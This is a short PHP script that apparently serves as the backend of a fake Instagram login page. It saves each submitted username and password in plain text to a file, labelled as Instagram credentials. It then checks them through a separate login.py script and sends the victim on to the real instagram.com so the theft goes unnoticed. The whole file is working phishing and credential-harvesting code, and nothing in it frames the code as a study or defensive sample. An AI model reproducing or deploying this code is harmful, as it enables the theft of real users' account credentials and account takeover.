<?php
$username = $_POST['username'] ?? '';
$password = $_POST['password'] ?? '';

file_put_contents("usernames.txt", "Instagram Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);

    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';

    if (empty($username) || empty($password)) {
        echo json_encode(['success' => false, 'message' => 'Username and password are required']);
        exit();
    }

    $command = 'python login.py ' . escapeshellarg($username) . ' ' . escapeshellarg($password);
    $output = shell_exec($command);
    $result = trim($output);

    if ($result === 'true') {
        header('Location: https://instagram.com');
    } else {
        echo json_encode(['success' => false, 'message' => 'Login failed']);
    }

exit();
?>







